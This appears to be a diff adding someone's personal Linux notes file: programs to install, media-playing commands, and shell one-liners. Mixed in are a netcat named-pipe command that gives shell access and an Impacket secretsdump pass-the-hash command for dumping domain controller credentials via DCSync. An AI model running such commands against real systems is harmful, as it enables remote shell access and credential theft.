@@ -1,0 +1,36 @@
+program to install
+rofi
+termit
+gnome-screenshot
+pamixer -- check what works for us
+mocp --- what is it
+Nitrogen
+compton
+#qrCode generator
+ echo "Ghi " | qrencode -t ansiutf8
+
+##important feature to add
+1 screeshot
+2 wifi management
+3 
+##playsound 
+ffplay --nodisp -autoexit -loglevel quiet filename.{wav,mp3,ogg,..} 
+aplay //for wav file
+mpg123 //for mp3
+mpv --vo=null -shuffle
+
+//giving shell access using nc(netcat) command
+ cat /tmp/f | /bin/sh -i 2>&1 | nc -l 127.0.0.1 1234 > /tmp/f
+python secretsdump.py -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 -just-dc LAB/DC2k8_1\$@172.16.102.15
+//this command to secretsDump words realted to this is Domanin Controller,
+DCSync, Active Directory.
+ nmap -v -A -p 31000-32000 localhost 
+//list all the open port on the server and the services they are running
+openssl s_client -connect localhost:port
+//connecting to server running ssl service
+cat kalibaliLink.txt | while read f; do mpv https://youtube.com/$f; done;
+reading link from a file and playing one by one on mpv
+find /usr/share/man/man1 -type f | shuf | awk -F '/' '/1/ {print $6}' | sed 's/.gz//g' | head -1 | xargs konsole -e man
+sudo ss -tulp //list all openPort on localhost
+for t in torrents/*.torrent;do transmission-cli -D $t; notify-send "Done"; done
+//download all torrent file
